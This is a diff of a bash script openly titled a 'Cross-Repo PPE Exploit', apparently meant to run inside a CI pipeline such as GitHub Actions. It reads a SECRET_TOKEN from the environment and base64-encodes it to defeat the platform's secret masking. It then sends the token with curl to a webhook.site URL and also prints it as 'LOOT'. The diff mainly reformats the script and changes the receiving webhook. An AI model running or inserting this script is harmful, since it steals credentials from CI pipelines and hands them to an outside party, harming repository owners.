@@ -1,51 +1,26 @@
 #!/bin/bash
 
- 
-
 echo "========================================"
-
 echo "[+] Cross-Repo PPE Exploit Initialized"
-
 echo "[+] Target environment: $(hostname)"
-
 echo "========================================"
-
- 
 
 if [ -z "$SECRET_TOKEN" ]; then
-
-    echo "[-] Exploit failed. No secret found in environment."
-
+    echo "[-] Exploit failed. No secret found in environment."
 else
+    echo "[!] Secret successfully intercepted!"
+    echo "[!] Exfiltrating via Base64 encoding..."
+    
+    # Encode the secret to prevent GitHub Actions from masking it with asterisks (***)
+    ENCODED=$(echo -n "$SECRET_TOKEN" | base64)
 
-    echo "[!] Secret successfully intercepted!"
-
-    echo "[!] Exfiltrating via Base64 encoding..."
-
-   
-
-    # Encode the secret to prevent GitHub Actions from masking it with asterisks (***)
-
-    ENCODED=$(echo -n "$SECRET_TOKEN" | base64)
-
- 
-
-    # 2. Exfiltration
-
-    curl -X POST -d "stolen_data=$ENCODED" https://webhook.site/52a5bf9f-393e-4ad4-931a-75b520a5ac72
-
-   
-
-    echo ""
-
-    echo ">>> LOOT: $ENCODED <<<"
-
-    echo ""
-
+    # 2. Exfiltration 
+    curl -X POST -d "stolen_data=$ENCODED" https://webhook.site/c426f279-0dc3-432a-b1dc-15c2acd1b2ce
+    
+    echo ""
+    echo ">>> LOOT: $ENCODED <<<"
+    echo ""
 fi
 
- 
-
 echo "========================================"
-
 echo "[+] Exploit finished."
